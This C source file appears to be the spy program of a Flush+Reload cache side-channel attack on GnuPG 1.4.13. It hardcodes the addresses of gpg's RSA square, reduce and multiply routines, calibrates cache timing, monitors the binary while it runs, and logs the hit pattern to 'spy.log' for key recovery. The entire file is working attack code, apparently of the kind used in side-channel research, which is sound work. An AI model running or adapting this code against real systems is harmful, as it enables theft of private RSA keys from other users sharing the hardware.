#include "fr/fr.h"

#define RSA_SQUARE (void*)0xbb9e5
#define RSA_REDUCE (void*)0xbaf9f
#define RSA_MULTIPLY (void*)0xbb367

int main(int argc, char** argv) {

	//order: square, reduce, multiply
	FR fr = fr_init( 2048*4, RSA_SQUARE, RSA_REDUCE, RSA_MULTIPLY);

	fr_calibrate(&fr, 1, 10000000, "scripts/calibration.csv");

	fr_monitor_elf(&fr, "gnupg-1.4.13/g10/gpg");

	FILE* file = fopen("spy.log", "w");

	for(unsigned int i=0; i < fr.res_len; i++){

		if( fr.results[i] == EMPTY_RESULT )
			fprintf(file, " ");
		else
			fprintf(file, "%u", fr.results[i]);
	}

	fclose(file);

	return 0;
}
